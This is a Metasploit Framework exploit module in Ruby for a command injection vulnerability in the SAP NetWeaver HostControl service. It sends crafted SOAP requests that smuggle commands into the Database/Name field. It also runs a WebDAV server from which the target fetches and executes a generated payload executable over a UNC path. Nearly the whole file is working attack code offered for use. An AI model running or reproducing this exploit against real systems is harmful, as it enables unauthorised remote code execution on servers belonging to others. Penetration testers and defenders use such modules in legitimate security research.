##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize
		super(
			'Name'        	=> 'SAP NetWeaver HostControl Command Injection',
			'Description'   => %q{
					This module exploits a command injection vulnerability in the SAPHostControl
				Service, by sending a specially crafted SOAP request to the management console.

				In order to deal with the spaces and length limitations, a WebDAV service is
				created to run an arbitrary payload when accessed as a UNC path. Because of this,
				the target host must have the WebClient service (WebDAV Mini-Redirector) enabled.
				It is enabled and automatically started by default on Windows XP SP3, but disabled
				by default on Windows 2003 SP2.
			},
			'Author'      => [
				'Michael Jordon', # Vulnerability discovery and PoC
				'juan vazquez' # Metasploit module
			],
			'Platform'    => 'win',
			'References'  =>
				[
					[ 'OSVDB', '84821'],
					[ 'URL', 'http://www.contextis.com/research/blog/sap4/' ],
					[ 'URL', 'https://websmp130.sap-ag.de/sap/support/notes/1341333' ] # Authentication Required
				],
			'Targets'     =>
				[
					[ 'SAP NetWeaver 7.02 SP6 / Windows with WebClient enabled', { } ],
				],
			'DefaultTarget'  => 0,
			'Privileged'     => true,
			'DisclosureDate' => 'Aug 14 2012'
		)
		register_options(
			[
				Opt::RPORT(1128),
				OptString.new('URIPATH',   [ true, "The URI to use (do not change)", "/" ]),
				OptPort.new('SRVPORT',     [ true, "The daemon port to listen on (do not change)", 80 ]),
			], self.class)
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		case request.method
			when 'OPTIONS'
				process_options(cli, request)
			when 'PROPFIND'
				process_propfind(cli, request)
			when 'GET'
				process_get(cli, request)
			else
				vprint_status("#{request.method} => 404 (#{request.uri})")
				resp = create_response(404, "Not Found")
				resp.body = ""
				resp['Content-Type'] = 'text/html'
				cli.send_response(resp)
		end
	end

	def process_get(cli, request)

		if blacklisted_path?(request.uri)
			vprint_status("GET => 404 [BLACKLIST] (#{request.uri})")
			resp = create_response(404, "Not Found")
			resp.body = ""
			cli.send_response(resp)
			return
		end

		if (request.uri.include? @basename)
			print_status("GET => Payload")
			return if ((p = regenerate_payload(cli)) == nil)
			data = generate_payload_exe({ :code => p.encoded })
			send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
			return
		end

		# Treat index.html specially
		if (request.uri[-1,1] == "/" or request.uri =~ /index\.html?$/i)
			vprint_status("GET => REDIRECT (#{request.uri})")
			resp = create_response(200, "OK")

			resp.body = %Q|<html><head><meta http-equiv="refresh" content="0;URL=#{@exploit_unc}#{@share_name}\\"></head><body></body></html>|

			resp['Content-Type'] = 'text/html'
			cli.send_response(resp)
			return
		end

		# Anything else is probably a request for a data file...
		vprint_status("GET => DATA (#{request.uri})")
		data = "HELLO!"
		send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
	end

	#
	# OPTIONS requests sent by the WebDav Mini-Redirector
	#
	def process_options(cli, request)
		vprint_status("OPTIONS #{request.uri}")
		headers = {
			'MS-Author-Via' => 'DAV',
			'DASL'          => '<DAV:sql>',
			'DAV'           => '1, 2',
			'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
			'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
			'Cache-Control' => 'private'
		}
		resp = create_response(207, "Multi-Status")
		headers.each_pair {|k,v| resp[k] = v }
		resp.body = ""
		resp['Content-Type'] = 'text/xml'
		cli.send_response(resp)
	end

	#
	# PROPFIND requests sent by the WebDav Mini-Redirector
	#
	def process_propfind(cli, request)
		path = request.uri
		vprint_status("PROPFIND #{path}")

		if path !~ /\/$/

			if blacklisted_path?(path)
				vprint_status "PROPFIND => 404 (#{path})"
				resp = create_response(404, "Not Found")
				resp.body = ""
				cli.send_response(resp)
				return
			end

			if path.index(".")
				vprint_status "PROPFIND => 207 File (#{path})"
				body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x100000)+128000}</lp1:getcontentlength>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
				# send the response
				resp = create_response(207, "Multi-Status")
				resp.body = body
				resp['Content-Type'] = 'text/xml; charset="utf8"'
				cli.send_response(resp)
				return
			else
				vprint_status "PROPFIND => 301 (#{path})"
				resp = create_response(301, "Moved")
				resp["Location"] = path + "/"
				resp['Content-Type'] = 'text/html'
				cli.send_response(resp)
				return
			end
		end

		vprint_status "PROPFIND => 207 Directory (#{path})"
		body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/">
	<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
		<D:href>#{path}</D:href>
		<D:propstat>
			<D:prop>
				<lp1:resourcetype><D:collection/></lp1:resourcetype>
				<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
				<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
				<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
				<D:supportedlock>
					<D:lockentry>
						<D:lockscope><D:exclusive/></D:lockscope>
						<D:locktype><D:write/></D:locktype>
					</D:lockentry>
					<D:lockentry>
						<D:lockscope><D:shared/></D:lockscope>
						<D:locktype><D:write/></D:locktype>
					</D:lockentry>
				</D:supportedlock>
				<D:lockdiscovery/>
				<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
			</D:prop>
		<D:status>HTTP/1.1 200 OK</D:status>
	</D:propstat>
</D:response>
|

		if request["Depth"].to_i > 0
			trail = path.split("/")
			trail.shift
			case trail.length
				when 0
					body << generate_shares(path)
				when 1
					body << generate_files(path)
			end
		else
			vprint_status "PROPFIND => 207 Top-Level Directory"
		end

		body << "</D:multistatus>"

		body.gsub!(/\t/, '')

		# send the response
		resp = create_response(207, "Multi-Status")
		resp.body = body
		resp['Content-Type'] = 'text/xml; charset="utf8"'
		cli.send_response(resp)
	end

	def generate_shares(path)
		share_name = @share_name
		%Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{share_name}/</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
|
	end

	def generate_files(path)
		trail = path.split("/")
		return "" if trail.length < 2

		base  = @basename
		exts  = @extensions.gsub(",", " ").split(/\s+/)
		files = ""
		exts.each do |ext|
			files << %Q|
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}#{base}.#{ext}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype/>
<lp1:creationdate>#{gen_datestamp}</lp1:creationdate>
<lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>
<lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>
<lp1:getetag>"#{"%.16x" % rand(0x100000000)}"</lp1:getetag>
<lp2:executable>T</lp2:executable>
<D:supportedlock>
<D:lockentry>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
<D:lockentry>
<D:lockscope><D:shared/></D:lockscope>
<D:locktype><D:write/></D:locktype>
</D:lockentry>
</D:supportedlock>
<D:lockdiscovery/>
<D:getcontenttype>application/octet-stream</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
<D:ishidden b:dt="boolean">1</D:ishidden>
</D:propstat>
</D:response>
|
		end

		files
	end

	def gen_timestamp(ttype=nil)
		::Time.now.strftime("%a, %d %b %Y %H:%M:%S GMT")
	end

	def gen_datestamp(ttype=nil)
		::Time.now.strftime("%Y-%m-%dT%H:%M:%SZ")
	end

	# This method rejects requests that are known to break exploitation
	def blacklisted_path?(uri)
		share_path = "/#{@share_name}"
		payload_path = "#{share_path}/#{@basename}.exe"
		case uri
			when payload_path
				return false
			when share_path
				return false
			else
				return true
		end
	end

	def check

		@peer = "#{rhost}:#{rport}"

		soap = <<-eos
<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema">
	<SOAP-ENV:Header>
		<sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
			<enableSession>true</enableSession>
		</sapsess:Session>
	</SOAP-ENV:Header>
	<SOAP-ENV:Body>
		<ns1:GetDatabaseStatus xmlns:ns1='urn:SAPHostControl'>
			<aArguments>
				<item>
					<mKey>Database/Type</mKey>
					<mValue>ada</mValue>
				</item>
				<item>
					<mKey>Database/Password</mKey>
					<mValue>#{rand_text_alphanumeric(8)}</mValue>
				</item>
				<item>
					<mKey>Database/Username</mKey>
					<mValue>control</mValue>
				</item>
				<item>
					<mKey>Database/Name</mKey>
					<mValue>NSP \-o c:\\#{rand_text_alpha_lower(4)}.txt \-n #{rand_text_alpha_lower(8)}
!#{rand_text_alpha_lower(8)}
</mValue>
				</item>
			</aArguments>
		</ns1:GetDatabaseStatus>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
		eos

		print_status("#{@peer} - Testing command injection...")

		res = send_request_cgi({
			'uri'          => '/',
			'method'       => 'POST',
			'ctype'        => 'text/xml; charset=utf-8',
			'headers'	   => {
				'SOAPAction' => "\"\"",
			},
			'data'         => soap,
		}, 10)

		if (res and res.code == 500 and res.body =~ /Generic error/)
			return CheckCode::Appears
		else
			return CheckCode::Safe
		end

	end

	def exploit

		@basename = rand_text_alpha(3)
		@share_name = rand_text_alpha(3)
		@extensions = "exe"
		@system_commands_file = rand_text_alpha_lower(4)

		myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']

		@exploit_unc  = "\\\\#{myhost}\\"

		if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
			fail_with(Exploit::Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')
		end

		vprint_status("Payload available at #{@exploit_unc}#{@share_name}\\#{@basename}.exe")


		@peer = "#{rhost}:#{rport}"

		soap = <<-eos
<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema">
	<SOAP-ENV:Header>
		<sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
			<enableSession>true</enableSession>
		</sapsess:Session>
	</SOAP-ENV:Header>
	<SOAP-ENV:Body>
		<ns1:GetDatabaseStatus xmlns:ns1='urn:SAPHostControl'>
			<aArguments>
				<item>
					<mKey>Database/Type</mKey>
					<mValue>ada</mValue>
				</item>
				<item>
					<mKey>Database/Password</mKey>
					<mValue>#{rand_text_alphanumeric(8)}</mValue>
				</item>
				<item>
					<mKey>Database/Username</mKey>
					<mValue>control</mValue>
				</item>
				<item>
					<mKey>Database/Name</mKey>
					<mValue>NSP \-o c:\\#{@system_commands_file}.txt \-n #{rand_text_alpha_lower(8)}
!#{@exploit_unc}#{@share_name}\\#{@basename}.exe
</mValue>
				</item>
			</aArguments>
		</ns1:GetDatabaseStatus>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
		eos

		print_status("#{@peer} - Injecting system commands...")

		res = send_request_cgi({
			'uri'          => '/',
			'method'       => 'POST',
			'ctype'        => 'text/xml; charset=utf-8',
			'headers'	   => {
				'SOAPAction'     => "\"\"",
			},
			'data'         => soap,
		}, 10)

		if (res and res.code == 500 and res.body =~ /Generic error/)
			print_good("#{@peer} - System command successfully injected")
		else
			print_error("#{@peer} - Failed to inject system command")
			return
		end

		soap = <<-eos
<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema">
	<SOAP-ENV:Header>
		<sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
			<enableSession>true</enableSession>
		</sapsess:Session>
	</SOAP-ENV:Header>
	<SOAP-ENV:Body>
		<ns1:GetDatabaseStatus xmlns:ns1='urn:SAPHostControl'>
			<aArguments>
				<item>
					<mKey>Database/Type</mKey>
					<mValue>ada</mValue>
				</item>
				<item>
					<mKey>Database/Password</mKey>
					<mValue>#{rand_text_alphanumeric(8)}</mValue>
				</item>
				<item>
					<mKey>Database/Username</mKey>
					<mValue>control</mValue>
				</item>
				<item>
					<mKey>Database/Name</mKey>
					<mValue>NSP \-ic c:\\#{@system_commands_file}.txt</mValue>
				</item>
			</aArguments>
		</ns1:GetDatabaseStatus>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
		eos

		print_status("#{@peer} - Executing injected command")

		res = send_request_cgi({
			'uri'          => '/',
			'method'       => 'POST',
			'ctype'        => 'text/xml; charset=utf-8',
			'headers'	   => {
				'SOAPAction'     => "\"\"",
			},
			'data'         => soap,
		}, 1)

		if res
			print_error("#{@peer} - Failed to execute injected command")
			return
		end

		super
	end
end
